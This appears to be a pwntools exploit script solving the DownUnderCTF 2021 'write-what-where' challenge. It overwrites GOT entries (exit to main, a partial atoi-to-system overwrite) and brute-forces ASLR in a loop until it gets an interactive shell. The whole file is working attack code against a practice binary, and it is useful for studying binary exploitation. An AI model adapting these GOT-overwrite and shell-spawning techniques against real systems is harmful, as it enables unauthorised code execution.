#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./write-what-where')

context.log_level = 'WARN'

attempt = 0
while True:
	try:
		if args.REMOTE:
			p = remote('pwn-2021.duc.tf', 31920)
			libc = ELF('./libc.so.6')
			tout = 1.0
		else:
			p = process(binary.path)
			libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
			tout = 0.5

		assert(libc.sym.system - libc.sym.atoi + (libc.sym.atoi & 0xfff) < 0x10000), '\nthis libc will not work\n'

		attempt += 1
		log.warn('attempt: ' + str(attempt))

		p.sendafter(b'what?\n',p32(binary.sym.main))
		p.sendafter(b'where?\n',str(binary.got.exit).encode())

		p.sendafter(b'what?\n',p32(((libc.sym.system | 0xf000) & 0xffff) << 16))
		p.sendafter(b'where?\n',str(binary.got.atoi - 2).encode())

		p.sendafter(b'what?\n',b'0000',timeout=tout)
		p.sendafter(b'where?\n',b'/bin/sh\0',timeout=tout)

		p.sendline(b'echo shell')
		if b'shell' in p.recvline(timeout=tout):
			p.interactive()
			break
	except AssertionError as err:
		print(err)
		sys.exit(1)
	except:
		try:
			p.close()
		except:
			continue

